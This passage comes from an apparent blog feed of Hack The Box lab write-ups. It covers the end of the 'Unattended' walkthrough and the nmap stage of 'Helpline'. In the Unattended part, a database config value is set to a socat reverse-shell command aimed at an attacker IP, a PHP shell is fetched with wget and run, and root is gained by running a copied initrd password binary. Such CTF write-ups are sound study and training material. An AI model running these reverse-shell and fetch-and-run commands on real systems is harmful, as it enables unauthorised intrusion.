&lt;h4 id=&quot;apparently-these-scripts-get-executed-from-time-to-time-we-cant-read-these-scripts-or-replace-them-but-we-can-change-the-value-of-that-configuration-from-the-database-and-put-a-reverse-shell-command-theres-no-nc-so-i-used-socat-&quot;&gt;Apparently these scripts get executed from time to time, we can’t read these scripts or replace them, but we can change the value of that configuration from the database and put a reverse shell command. There’s no &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;socat&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [neddy]&amp;gt; update config set option_value=&quot;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443;&quot; where id=86;
Query OK, 0 rows affected (0.00 sec)
Rows matched: 1  Changed: 0  Warnings: 0                                                     

MariaDB [neddy]&amp;gt; select * from config;
select * from config;                                                                       
----------------
 Removed Output
----------------
|  86 | checkrelease            | socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443; |
----------------
 Removed Output
----------------
52 rows in set (0.00 sec)

MariaDB [neddy]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;initrd-root-flag&quot;&gt;initrd, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-a-shell-as-guly-i-terminated-my-meterpreter-session-as-www-data-and-got-a-new-one-as-guly-&quot;&gt;After getting a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; I terminated my &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; and got a new one as &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp$ wget http://10.10.xx.xx/shell.php
wget http://10.10.xx.xx/shell.php
--2019-08-23 13:25:49--  http://10.10.xx.xx/shell.php
Connecting to 10.10.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1110 (1.1K) [application/octet-stream]
Saving to: ‘shell.php’

shell.php           100%[===================&amp;gt;]   1.08K  --.-KB/s    in 0s

2019-08-23 13:25:49 (100 MB/s) - ‘shell.php’ saved [1110/1110]

guly@unattended:/tmp$ php ./shell.php
php ./shell.php
/*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-noticed-that-guly-was-in-the-local-group-grub-i-searched-for-files-that-are-owned-by-this-group-&quot;&gt;I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; was in the local group &lt;code class=&quot;highlighter-rouge&quot;&gt;grub&lt;/code&gt;, I searched for files that are owned by this group :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp$ find / -group grub
find / -group grub
find: ‘/proc/tty/driver’: Permission denied
find: ‘/proc/1146/task/1146/fd/7’: No such file or directory
find: ‘/proc/1146/task/1146/fdinfo/7’: No such file or directory
find: ‘/proc/1146/fd/6’: No such file or directory
find: ‘/proc/1146/fdinfo/6’: No such file or directory
find: ‘/lost+found’: Permission denied
find: ‘/var/spool/cron/crontabs’: Permission denied
find: ‘/var/spool/rsyslog’: Permission denied
find: ‘/var/tmp/vmware-root_861-3988621786’: Permission denied
find: ‘/var/tmp/vmware-root’: Permission denied
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-Mjh5Or’: Permission denied           
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-xDCH4o’: Permission denied  
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-w07Cfj’: Permission denied
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-90T8ai’: Permission denied
find: ‘/var/log/mysql’: Permission denied
find: ‘/var/log/apache2’: Permission denied
find: ‘/var/lib/vmware-caf/pme/data/input/monitor’: Permission denied
find: ‘/var/lib/vmware-caf/pme/data/output’: Permission denied
find: ‘/var/lib/php/sessions’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/mysql/mysql’: Permission denied
find: ‘/var/lib/mysql/performance_schema’: Permission denied
find: ‘/var/lib/mysql/neddy’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/cache/ldconfig’: Permission denied
find: ‘/var/cache/apt/archives/partial’: Permission denied
find: ‘/boot/lost+found’: Permission denied
/boot/initrd.img-4.9.0-8-amd64
find: ‘/root’: Permission denied
find: ‘/sys/kernel/debug’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/etc/vmware-tools/GuestProxyData/trusted’: Permission denied
find: ‘/tmp/vmware-root_861-3988621786’: Permission denied
find: ‘/tmp/vmware-root’: Permission denied
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-Mjh5Or’: Permission denied
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-xDCH4o’: Permission denied
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-w07Cfj’: Permission denied    
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-90T8ai’: Permission denied         
find: ‘/run/log/journal/b0fa41b1a9b848e8b54df33b345577c8’: Permission denied
find: ‘/run/systemd/inaccessible’: Permission denied
guly@unattended:/tmp$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-could-only-access-bootinitrdimg-490-8-amd64-so-i-created-a-directory-in-tmp-and-copied-it-there&quot;&gt;I could only access &lt;code class=&quot;highlighter-rouge&quot;&gt;/boot/initrd.img-4.9.0-8-amd64&lt;/code&gt;, so I created a directory in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and copied it there.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp$ mkdir initrd
mkdir initrd
guly@unattended:/tmp$ cd initrd
cd initrd
guly@unattended:/tmp/initrd$ cp /boot/initrd.img-4.9.0-8-amd64 .
cp /boot/initrd.img-4.9.0-8-amd64 .
guly@unattended:/tmp/initrd$ ls -la
ls -la
total 19256
drwxr-xr-x  2 guly guly       60 Aug 23 13:34 .
drwxrwxrwt 14 root root      300 Aug 23 13:34 ..
-rw-r-----  1 guly guly 19715792 Aug 23 13:34 initrd.img-4.9.0-8-amd64
guly@unattended:/tmp/initrd$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;initrd-is-the-abbreviation-for-initial-ramdisk&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;initrd&lt;/code&gt; is the abbreviation for &lt;a href=&quot;https://en.wikipedia.org/wiki/Initial_ramdisk&quot;&gt;initial ramdisk&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;using-file-on-it-says-that-its-a-gzip-archive-&quot;&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; on it says that it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;gzip&lt;/code&gt; archive :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ ls -la
ls -la
total 19256
drwxr-xr-x  2 guly guly       60 Aug 23 13:55 .
drwxrwxrwt 14 root root      300 Aug 23 13:55 ..
-rw-r-----  1 guly guly 19715792 Aug 23 13:54 initrd.img-4.9.0-8-amd64
guly@unattended:/tmp/initrd$ file initrd.img-4.9.0-8-amd64
file initrd.img-4.9.0-8-amd64
initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Fri Aug 23 09:26:41 2019, from Unix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-renamed-it-to-initrdimg-490-8-amd64gz--then-i-used-gzip-to-extract-it-&quot;&gt;I renamed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;initrd.img-4.9.0-8-amd64.gz&lt;/code&gt;  then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;gzip&lt;/code&gt; to extract it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz
4.gznitrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64
guly@unattended:/tmp/initrd$ gzip -d initrd.img-4.9.0-8-amd64.gz
gzip -d initrd.img-4.9.0-8-amd64.gz
guly@unattended:/tmp/initrd$ ls -la
ls -la
total 60656
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 .
drwxrwxrwt 14 root root      300 Aug 23 13:56 ..
-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-new-file-is-a-cpio-archive-&quot;&gt;The new file is a &lt;code class=&quot;highlighter-rouge&quot;&gt;cpio&lt;/code&gt; archive :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ file initrd.img-4.9.0-8-amd64
file initrd.img-4.9.0-8-amd64
initrd.img-4.9.0-8-amd64: ASCII cpio archive (SVR4 with no CRC)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;to-extract-it-&quot;&gt;To extract it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ cpio -idvm &amp;lt; initrd.img-4.9.0-8-amd64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-extracting-it-we-get-a-lot-of-files-&quot;&gt;After extracting it we get a lot of files :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ ls -la
ls -la
total 60664
drwxr-xr-x 11 guly guly      260 Aug 23 13:56 .
drwxrwxrwt 14 root root      300 Aug 23 13:57 ..
drwxr-xr-x  2 guly guly     3600 Aug 23 13:56 bin
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 boot
drwxr-xr-x  3 guly guly      120 Aug 23 13:56 conf
drwxr-xr-x  5 guly guly      240 Aug 23 13:56 etc
-rwxr-xr-x  1 guly guly     5960 Apr 23  2017 init
-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
drwxr-xr-x  8 guly guly      180 Aug 23 13:56 lib
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 lib64
drwxr-xr-x  2 guly guly       40 Aug 23 05:26 run
drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin
drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts
guly@unattended:/tmp/initrd$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;searching-for-guly-in-these-files-reveals-this-interesting-comment-in-a-script-called-cryptroot-&quot;&gt;Searching for &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; in these files reveals this interesting comment in a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptroot&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ grep -r guly *             
grep -r guly *
Binary file initrd.img-4.9.0-8-amd64 matches           
scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-checked-that-part-of-the-script-&quot;&gt;I checked that part of the script :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;               if [ ! -e &quot;$NEWROOT&quot; ]; then
      # guly: we have to deal with lukfs password sync when root changes her one
      if ! crypttarget=&quot;$crypttarget&quot; cryptsource=&quot;$cryptsource&quot; \
        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
                                message &quot;cryptsetup: cryptsetup failed, bad password or options?&quot;
                                sleep 3
                                continue

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-line-sbinuinitrd-c0m3s3f0ss34nt4n1--cryptopen-generates-root-password-and-pipes-it-to-cryptopen-we-dont-have-permission-to-execute-uinitrd-&quot;&gt;This line &lt;code class=&quot;highlighter-rouge&quot;&gt;/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen&lt;/code&gt; generates root password and pipes it to &lt;code class=&quot;highlighter-rouge&quot;&gt;$cryptopen&lt;/code&gt;. We don’t have permission to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;uinitrd&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ /sbin/uinitrd c0m3s3f0ss34nt4n1
/sbin/uinitrd c0m3s3f0ss34nt4n1
bash: /sbin/uinitrd: Permission denied
guly@unattended:/tmp/initrd$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-in-the-extracted-files-we-have-the-same-binary-and-we-can-execute-it-&quot;&gt;But in the extracted files we have the same binary and we can execute it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;guly@unattended:/tmp/initrd$ ls -la
ls -la
total 60664
drwxr-xr-x 11 guly guly      260 Aug 23 13:56 .
drwxrwxrwt 14 root root      340 Aug 23 14:02 ..
drwxr-xr-x  2 guly guly     3600 Aug 23 13:56 bin
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 boot
drwxr-xr-x  3 guly guly      120 Aug 23 13:56 conf
drwxr-xr-x  5 guly guly      240 Aug 23 13:56 etc
-rwxr-xr-x  1 guly guly     5960 Apr 23  2017 init
-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
drwxr-xr-x  8 guly guly      180 Aug 23 13:56 lib
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 lib64
drwxr-xr-x  2 guly guly       40 Aug 23 05:26 run
drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin
drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts
guly@unattended:/tmp/initrd$ ls -la sbin | grep uinitrd
ls -la sbin | grep uinitrd
-rwxr-x---   1 guly guly 933240 Aug 23 05:26 uinitrd
guly@unattended:/tmp/initrd$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---helpline&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/helpline/&quot;&gt;Hack The Box - Helpline&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="firewall" /><category term="RCE" /><category term="LFI" /><category term="php" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today Unattended retired and here’s my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting SQL injection vulnerability that could be escalated to local file inclusion then to remote code execution and that’s my favorite part about this box. It’s a Linux box and its ip is 10.10.10.126, I added it to /etc/hosts as unattended.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC unattended.htb Only http and https, and surprisingly no ssh. Also the ssl certificate from the https port tells us that the common name is www.nestedflanders.htb so I added that to my hosts file : Web Enumeration Checking unattended.htb on both 80 and 443 gives us a blank page : http://www.nestedflanders.htb responds with a redirection to https://www.nestedflanders.htb which has the default Apache page : I used wfuzz to enumerate sub directories and it was weird to see both index.php and index.html with different content : ``` root@kali:~/Desktop/HTB/boxes/unattended# wfuzz –hc 404 -c -u https://www.nestedflanders.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/unattended/0.png" /></entry><entry><title type="html">Hack The Box - Helpline</title><link href="http://localhost:4000/hack-the-box/helpline/" rel="alternate" type="text/html" title="Hack The Box - Helpline" /><published>2019-08-17T00:00:00+02:00</published><updated>2019-08-17T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/helpline</id><content type="html" xml:base="http://localhost:4000/hack-the-box/helpline/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-helpline-retired-and-heres-my-write-up-about-it-i-really-liked-this-box-because-it-taught-me-some-interesting-stuff-about-windows-internals-the-first-shell-i-got-on-this-box-was-as-nt-authoritysystem-which-means-that-i-technically-rooted-the-box-but-the-flags-were-efs-encrypted-so-i-had-to-find-a-way-to-read-them-its-a-windows-box-and-its-ip-is-101010152-i-added-it-to-etchosts-as-helplinehtb-lets-jump-right-in-&quot;&gt;Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority/system&lt;/code&gt; which means that I technically rooted the box. But the flags were &lt;code class=&quot;highlighter-rouge&quot;&gt;EFS&lt;/code&gt; encrypted so I had to find a way to read them. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.152&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;helpline.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb
Nmap scan report for helpline.htb (10.10.10.132)
Host is up (0.10s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
8080/tcp open  http-proxy    -
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Thu, 15 Aug 2019 17:55:43 GMT
|     Connection: close
|     Server: -
|     &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE=Edge&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/scripts/Login.js?9309'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/scripts/jquery-1.8.3.min.js'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/loginstyle.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/new-classes.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/new-classes-sdp.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/conflict-fix.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Thu, 15 Aug 2019 17:55:45 GMT
|     Connection: close
|     Server: -
|     &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE=Edge&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/scripts/Login.js?9309'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/scripts/jquery-1.8.3.min.js'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
